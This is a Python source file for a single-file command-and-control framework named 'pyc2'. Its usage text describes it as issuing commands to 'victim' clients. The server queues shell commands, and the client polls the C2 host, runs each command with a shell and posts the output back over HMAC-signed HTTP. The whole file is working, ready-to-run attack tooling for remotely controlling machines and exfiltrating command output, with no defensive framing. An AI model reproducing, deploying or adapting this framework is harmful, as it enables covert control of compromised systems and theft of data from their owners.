#!/usr/bin/env python3
"""
pyc2.py — Single-file C2 (command & control) framework

USAGE (Server):
  sudo python pyc2.py --server --port 8000 --secret your_shared_secret

Then at the “C2> ” prompt:
  send victim1 whoami
  send victim2 uname -a

USAGE (Client):
  python pyc2.py --client --url http://C2_HOST:8000 --client-id victim1 \
                 --secret your_shared_secret --poll 5

FEATURES:
 - HMAC-SHA256 signed JSON over HTTP
 - GET /cmd?client_id=...&ts=...&sig=...   ← client pulls commands
 - POST /res with signed JSON body         ← client pushes results
 - Interactive server CLI for issuing commands
 - Concurrent HTTP server + CLI thread
 - Secure message authenticity & replay protection (timestamp check)
"""
import argparse, threading, time, hmac, hashlib, json, subprocess, sys, os
from http.server    import HTTPServer, BaseHTTPRequestHandler
from urllib.request import urlopen, Request
from urllib.parse   import urlparse, parse_qs

# -- Globals (server) --
commands = {}         # client_id -> (cmd_id:int, cmd:str)
secret   = b""        # set from args
results  = {}         # client_id -> list of (cmd_id, output)

# -- Helpers --
def sign(msg: bytes) -> str:
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()

def verify(msg: bytes, sig: str) -> bool:
    return hmac.compare_digest(sign(msg), sig)

# -- HTTP Handler (Server mode) --
class C2Handler(BaseHTTPRequestHandler):
    def _send_json(self, obj, code=200):
        data = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path != "/cmd":
            return self.send_error(404)
        qs       = parse_qs(parsed.query)
        cid_list = qs.get("client_id",[])
        ts_list  = qs.get("ts",[])
        sig_list = qs.get("sig",[])
        if not (cid_list and ts_list and sig_list):
            return self.send_error(400,"Missing params")
        client_id, ts, sig = cid_list[0], ts_list[0], sig_list[0]
        # verify timestamp freshness
        try:
            if abs(time.time() - float(ts)) > 60:
                return self.send_error(403,"Stale timestamp")
        except: return self.send_error(400,"Bad ts")
        # verify signature
        msg = (client_id + ts).encode()
        if not verify(msg, sig):
            return self.send_error(403,"Bad signature")
        # fetch command for this client
        cmd_id, cmd = commands.get(client_id, (0,""))
        resp = {"client_id":client_id, "cmd_id":cmd_id, "cmd":cmd, "ts":str(time.time())}
        # sign the response body (excluding sig)
        resp["sig"] = sign(json.dumps(resp, sort_keys=True).encode())
        return self._send_json(resp)

    def do_POST(self):
        if self.path != "/res":
            return self.send_error(404)
        length = int(self.headers.get("Content-Length",0))
        body   = self.rfile.read(length)
        try:
            data = json.loads(body)
            cid = data["client_id"]; cid = str(cid)
            cmd_id = int(data["cmd_id"])
            out     = data["output"]
            ts      = data["ts"]
            sig     = data["sig"]
        except Exception as e:
            return self.send_error(400, f"Bad JSON: {e}")
        # verify timestamp & signature
        try:
            if abs(time.time() - float(ts)) > 300:
                return self.send_error(403,"Stale timestamp")
        except:
            return self.send_error(400,"Bad ts")
        # reconstruct payload for verification
        verify_payload = {"client_id":cid,"cmd_id":cmd_id,"output":out,"ts":ts}
        if not verify(json.dumps(verify_payload, sort_keys=True).encode(), sig):
            return self.send_error(403,"Invalid signature")
        # store result
        results.setdefault(cid,[]).append((cmd_id, out))
        print(f"\n[+] Result from {cid} cmd_id={cmd_id}:\n{out}")
        self._send_json({"status":"OK"})

# -- Server CLI Thread --
def server_cli():
    print("C2> send <client_id> <command>    | issue a command")
    print("C2> list                          | show queued clients")
    print("C2> quit                          | exit")
    while True:
        try:
            line = input("C2> ").strip()
        except EOFError:
            os._exit(0)
        if not line: continue
        parts = line.split()
        cmd = parts[0].lower()
        if cmd=="send" and len(parts)>=3:
            cid = parts[1]; command = " ".join(parts[2:])
            old_id, _ = commands.get(cid,(0,""))
            new_id = old_id+1
            commands[cid] = (new_id, command)
            print(f"[+] Queued to {cid}: id={new_id} -> {command}")
        elif cmd=="list":
            for cid,(i,c) in commands.items():
                print(f"  {cid}: last_id={i}, cmd={c}")
        elif cmd in ("quit","exit"):
            print("[*] Shutting down.")
            os._exit(0)
        else:
            print("Usage: send <client_id> <command> | list | quit")

# -- Server Entry Point --
def run_server(port):
    srv = HTTPServer(("0.0.0.0", port), C2Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[*] C2 HTTP server listening on 0.0.0.0:{port}")
    server_cli()

# -- Client Logic --
def run_client(server_url, client_id, poll_interval):
    last_seen = 0
    print(f"[*] Client '{client_id}' polling {server_url}/cmd every {poll_interval}s")
    while True:
        ts = str(time.time())
        msg = (client_id + ts).encode()
        sig = sign(msg)
        url = f"{server_url}/cmd?client_id={client_id}&ts={ts}&sig={sig}"
        try:
            resp = urlopen(url, timeout=10)
            data = json.loads(resp.read())
        except Exception as e:
            print(f"[!] Poll error: {e}")
            time.sleep(poll_interval)
            continue
        # verify server signature
        server_sig = data.pop("sig",None)
        server_ts  = data.get("ts","0")
        if abs(time.time()-float(server_ts))>60 or not verify(json.dumps(data,sort_keys=True).encode(), server_sig):
            print("[!] Invalid server response signature")
            time.sleep(poll_interval)
            continue
        cmd_id, cmd = data.get("cmd_id",0), data.get("cmd","")
        if cmd_id>last_seen and cmd:
            print(f"[*] Executing id={cmd_id}: {cmd}")
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            # send result back
            payload = {"client_id":client_id,"cmd_id":cmd_id,"output":output,"ts":str(time.time())}
            payload["sig"] = sign(json.dumps(payload, sort_keys=True).encode())
            req = Request(f"{server_url}/res", data=json.dumps(payload).encode(),
                          headers={"Content-Type":"application/json"})
            try:
                urlopen(req, timeout=10)
                last_seen = cmd_id
            except Exception as e:
                print(f"[!] Failed to POST result: {e}")
        time.sleep(poll_interval)

# -- Main --
if __name__=="__main__":
    p = argparse.ArgumentParser(description="pyc2 — simple HTTP C2 framework")
    p.add_argument("--server", action="store_true", help="run in server mode")
    p.add_argument("--client", action="store_true", help="run in client mode")
    p.add_argument("--port",   type=int,   default=8000, help="C2 server port")
    p.add_argument("--url",    type=str,   help="C2 server URL (e.g. http://1.2.3.4:8000)")
    p.add_argument("--client-id", type=str, help="unique client identifier")
    p.add_argument("--secret", required=True, help="shared HMAC secret")
    p.add_argument("--poll",   type=int, default=5, help="client polling interval (s)")
    args = p.parse_args()

    secret = args.secret.encode()
    if args.server:
        run_server(args.port)
    elif args.client:
        if not (args.url and args.client_id):
            print("ERROR: --url and --client-id are required in client mode", file=sys.stderr)
            sys.exit(1)
        run_client(args.url.rstrip("/"), args.client_id, args.poll)
    else:
        p.print_help()
